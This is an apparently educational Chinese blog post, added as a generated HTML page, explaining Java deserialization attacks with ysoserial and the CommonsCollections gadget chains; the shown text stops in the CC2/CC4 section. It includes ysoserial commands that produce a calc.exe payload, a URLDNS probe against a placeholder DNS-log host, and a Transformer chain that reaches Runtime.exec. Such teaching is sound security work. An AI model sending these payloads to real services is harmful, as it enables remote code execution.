@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言Java反序列化漏洞是近年来Java安全领域最核心的攻击面之一。自2015年Gabriel Lawrence和Chris Frohoff在AppSecCali上发表《Marshalling Pickles》后，反序列化漏洞成为渗透测试和Java安全防御中的焦点。本文从底层机制出发，系统梳理反序列化攻击原理、ysoserial工具链、CommonsCollections各版本链（CC1-CC7）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化漏洞">
+<meta property="og:url" content="https://congliang.github.io/Deserialization-java-ysoserial/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言Java反序列化漏洞是近年来Java安全领域最核心的攻击面之一。自2015年Gabriel Lawrence和Chris Frohoff在AppSecCali上发表《Marshalling Pickles》后，反序列化漏洞成为渗透测试和Java安全防御中的焦点。本文从底层机制出发，系统梳理反序列化攻击原理、ysoserial工具链、CommonsCollections各版本链（CC1-CC7）">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.858Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="框架安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Deserialization-java-ysoserial/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Deserialization-java-ysoserial/","path":"Deserialization-java-ysoserial/","title":"Java反序列化漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java反序列化漏洞 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-number">2.</span> <span class="nav-text">一、Java序列化与反序列化基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 序列化机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-readObject-%E2%80%94-%E6%BC%8F%E6%B4%9E%E6%A0%B9%E6%BA%90"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 readObject — 漏洞根源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 攻击流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81ysoserial-%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="nav-number">3.</span> <span class="nav-text">二、ysoserial 工具包</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E4%B8%BB%E8%A6%81Payload%E9%80%9F%E6%9F%A5"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 主要Payload速查</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81CommonsCollections-%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%A6%E8%A7%A3"><span class="nav-number">4.</span> <span class="nav-text">三、CommonsCollections 利用链详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Transformer%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 Transformer链式调用机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-CC1-%E2%80%94-%E7%BB%8F%E5%85%B8%E5%85%A5%E9%97%A8%E9%93%BE"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 CC1 — 经典入门链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-CC2-CC4-%E2%80%94-PriorityQueue-TemplatesImpl"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 CC2 &#x2F; CC4 — PriorityQueue + TemplatesImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-CC3-%E2%80%94-%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD%E8%B7%AF%E5%BE%84"><span class="nav-number">4.4.</span> <span class="nav-text">3.4 CC3 — 字节码加载路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-CC5-%E2%80%94-BadAttributeValueExpException%E5%85%A5%E5%8F%A3"><span class="nav-number">4.5.</span> <span class="nav-text">3.5 CC5 — BadAttributeValueExpException入口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-CC6-%E2%80%94-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%80%9A%E7%94%A8%E9%93%BE"><span class="nav-number">4.6.</span> <span class="nav-text">3.6 CC6 — 高版本JDK通用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-7-CC7-%E2%80%94-Hashtable%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E%E9%93%BE"><span class="nav-number">4.7.</span> <span class="nav-text">3.7 CC7 — Hashtable哈希碰撞链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81CommonsBeanutils%EF%BC%88CB%EF%BC%89%E9%93%BE"><span class="nav-number">5.</span> <span class="nav-text">四、CommonsBeanutils（CB）链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81JNDI-LDAP-%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">五、JNDI + LDAP 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-JNDI%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 JNDI注入基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%81%94%E5%90%88%E6%94%BB%E5%87%BB"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 与反序列化的联合攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 高版本JDK限制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81URLDNS-%E2%80%94-%E6%97%A0%E5%89%AF%E4%BD%9C%E7%94%A8%E6%8E%A2%E6%B5%8B"><span class="nav-number">7.</span> <span class="nav-text">六、URLDNS — 无副作用探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%8E%9F%E7%90%86"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E6%89%8B%E5%B7%A5%E6%9E%84%E9%80%A0"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 手工构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%AE%9E%E6%88%98%E6%B5%81%E7%A8%8B"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 实战流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-URLDNS%E4%BC%98%E5%8A%BF"><span class="nav-number">7.4.</span> <span class="nav-text">6.4 URLDNS优势</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="nav-number">8.</span> <span class="nav-text">七、防御与修复</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E4%BE%A7"><span class="nav-number">8.1.</span> <span class="nav-text">开发侧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E7%BB%B4%E4%BE%A7"><span class="nav-number">8.2.</span> <span class="nav-text">运维侧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">八、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">10.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Deserialization-java-ysoserial/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java反序列化漏洞 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java反序列化漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-05-01 08:00:00" itemprop="dateCreated datePublished" datetime="2026-05-01T08:00:00+08:00">2026-05-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java反序列化漏洞是近年来Java安全领域最核心的攻击面之一。自2015年Gabriel Lawrence和Chris Frohoff在AppSecCali上发表《Marshalling Pickles》后，反序列化漏洞成为渗透测试和Java安全防御中的焦点。本文从底层机制出发，系统梳理反序列化攻击原理、ysoserial工具链、CommonsCollections各版本链（CC1-CC7）、CommonsBeanutils利用链、JNDI+LDAP注入以及URLDNS探测技巧。</p>
+<h2 id="一、Java序列化与反序列化基础"><a href="#一、Java序列化与反序列化基础" class="headerlink" title="一、Java序列化与反序列化基础"></a>一、Java序列化与反序列化基础</h2><h3 id="1-1-序列化机制"><a href="#1-1-序列化机制" class="headerlink" title="1.1 序列化机制"></a>1.1 序列化机制</h3><p>Java对象通过实现<code>java.io.Serializable</code>接口来获得序列化能力。对象状态被转换为字节流，可用于持久化存储或网络传输。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String password; <span class="comment">// transient字段不会被序列化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化与反序列化的基本操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;data.ser&quot;</span>));</span><br><span class="line">oos.writeObject(user);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化 —— 危险入口</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;data.ser&quot;</span>));</span><br><span class="line"><span class="type">User</span> <span class="variable">obj</span> <span class="operator">=</span> (User) ois.readObject(); <span class="comment">// 如果readObject中有恶意逻辑，此时触发</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-readObject-—-漏洞根源"><a href="#1-2-readObject-—-漏洞根源" class="headerlink" title="1.2 readObject — 漏洞根源"></a>1.2 readObject — 漏洞根源</h3><p><code>ObjectInputStream.readObject()</code>在反序列化时会自动调用被反序列化对象及其成员对象的<code>readObject()</code>方法。若某个类在自定义的<code>readObject()</code>中包含了反射调用、文件操作或命令执行逻辑，攻击者通过构造恶意序列化数据即可触发。</p>
+<p><strong>核心成因</strong>：应用反序列化不可信数据时，未对类进行白名单校验，攻击者构造”Gadget Chain”（利用链）串联多个类的方法调用，将无害的入口引向危险的终点。</p>
+<h3 id="1-3-攻击流程"><a href="#1-3-攻击流程" class="headerlink" title="1.3 攻击流程"></a>1.3 攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[构造恶意序列化数据] -&gt; [通过HTTP/RMI/JMX/JMS发送至目标]</span><br><span class="line">    -&gt; [目标调用readObject()] -&gt; [触发Gadget Chain] -&gt; [任意代码执行/DNS外带]</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、ysoserial-工具包"><a href="#二、ysoserial-工具包" class="headerlink" title="二、ysoserial 工具包"></a>二、ysoserial 工具包</h2><h3 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h3><p>ysoserial是Chris Frohoff与Gabriel Lawrence开发的反序列化Payload生成工具，集成大量Gadget Chain，覆盖CommonsCollections、Spring、Groovy等多个库。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有Payload</span></span><br><span class="line">java -jar ysoserial.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成CC1的Payload</span></span><br><span class="line">java -jar ysoserial.jar CommonsCollections1 <span class="string">&quot;calc.exe&quot;</span> | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成URLDNS检测Payload</span></span><br><span class="line">java -jar ysoserial.jar URLDNS <span class="string">&quot;http://your-dnslog.example.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-主要Payload速查"><a href="#2-2-主要Payload速查" class="headerlink" title="2.2 主要Payload速查"></a>2.2 主要Payload速查</h3><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>依赖</th>
+<th>关键类</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CommonsCollections1</td>
+<td>CC 3.1</td>
+<td>AnnotationInvocationHandler</td>
+<td>经典入门链</td>
+</tr>
+<tr>
+<td>CommonsCollections2</td>
+<td>CC 4.0</td>
+<td>PriorityQueue, TemplatesImpl</td>
+<td>字节码加载</td>
+</tr>
+<tr>
+<td>CommonsCollections3</td>
+<td>CC 3.1</td>
+<td>TemplatesImpl + 代理</td>
+<td>绕过Runtime限制</td>
+</tr>
+<tr>
+<td>CommonsCollections4</td>
+<td>CC 4.0</td>
+<td>PriorityQueue</td>
+<td>CC2变体</td>
+</tr>
+<tr>
+<td>CommonsCollections5</td>
+<td>CC 3.1</td>
+<td>BadAttributeValueExpException</td>
+<td>兼容高版本JDK</td>
+</tr>
+<tr>
+<td>CommonsCollections6</td>
+<td>CC 3.1</td>
+<td>HashSet, TiedMapEntry</td>
+<td>JDK8高版本通用</td>
+</tr>
+<tr>
+<td>CommonsCollections7</td>
+<td>CC 3.1</td>
+<td>Hashtable碰撞</td>
+<td>Hashtable入口</td>
+</tr>
+<tr>
+<td>CommonsBeanutils1</td>
+<td>commons-beanutils</td>
+<td>BeanComparator</td>
+<td>无需CC依赖</td>
+</tr>
+<tr>
+<td>Jdk7u21</td>
+<td>JDK原生</td>
+<td>无需第三方库</td>
+<td>JDK &lt;&#x3D;7u21</td>
+</tr>
+<tr>
+<td>URLDNS</td>
+<td>JDK原生</td>
+<td>HashMap + URL</td>
+<td>无副作用探测</td>
+</tr>
+</tbody></table>
+<h2 id="三、CommonsCollections-利用链详解"><a href="#三、CommonsCollections-利用链详解" class="headerlink" title="三、CommonsCollections 利用链详解"></a>三、CommonsCollections 利用链详解</h2><h3 id="3-1-Transformer链式调用机制"><a href="#3-1-Transformer链式调用机制" class="headerlink" title="3.1 Transformer链式调用机制"></a>3.1 Transformer链式调用机制</h3><p>CC链核心是<code>org.apache.commons.collections.Transformer</code>接口，它通过<code>transform(Object input)</code>将输入转换为另一个对象。多个Transformer串联形成<code>ChainedTransformer</code>，一级级传递触发，最终抵达命令执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] chain = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),                        <span class="comment">// 返回Runtime.class</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),                 <span class="comment">// Ref: getRuntime方法</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),                        <span class="comment">// 反射调用获得Runtime实例</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)                                  <span class="comment">// 调用exec执行</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chain);</span><br><span class="line">chained.transform(<span class="string">&quot;anything&quot;</span>); <span class="comment">// 触发整条链，最终执行calc.exe</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-CC1-—-经典入门链"><a href="#3-2-CC1-—-经典入门链" class="headerlink" title="3.2 CC1 — 经典入门链"></a>3.2 CC1 — 经典入门链</h3><p>CC1利用<code>LazyMap.get()</code>的回调机制，结合<code>AnnotationInvocationHandler.invoke()</code>代理调用，将反序列化入口与Transformer链串联。</p>
+<p><strong>调用链</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt; proxyMap.entrySet()</span><br><span class="line">    -&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">      -&gt; LazyMap.get()</span><br><span class="line">        -&gt; ChainedTransformer.transform()</span><br><span class="line">          -&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>
+
+<p>核心构造：通过反射创建<code>AnnotationInvocationHandler</code>，将其成员<code>memberValues</code>设为<code>LazyMap</code>，再生成Map动态代理。当反序列化触发<code>readObject</code>时，<code>AnnotationInvocationHandler</code>遍历<code>memberValues</code>会调用代理对象的<code>entrySet()</code>，进而通过<code>invoke()</code>落入<code>LazyMap.get()</code>。</p>
+<h3 id="3-3-CC2-CC4-—-PriorityQueue-TemplatesImpl"><a href="#3-3-CC2-CC4-—-PriorityQueue-TemplatesImpl" class="headerlink" title="3.3 CC2 &#x2F; CC4 — PriorityQueue + TemplatesImpl"></a>3.3 CC2 &#x2F; CC4 — PriorityQueue + TemplatesImpl</h3><p>CC2使用<code>PriorityQueue.readObject()</code>作为入口，在堆排序（siftDown）过程中调用<code>Comparator.compare()</code>。配合<code>TransformingComparator</code>（CC2）或直接使用<code>PriorityQueue</code>自身的比较逻辑（CC4），最终触发<code>TemplatesImpl.newTransformer()</code>加载恶意字节码。</p>
+<p>CC2与CC4的区别在于：CC2使用<code>InvokerTransformer</code>构造比较器；CC4改用<code>ChainedTransformer</code>，链路上更灵活。</p>
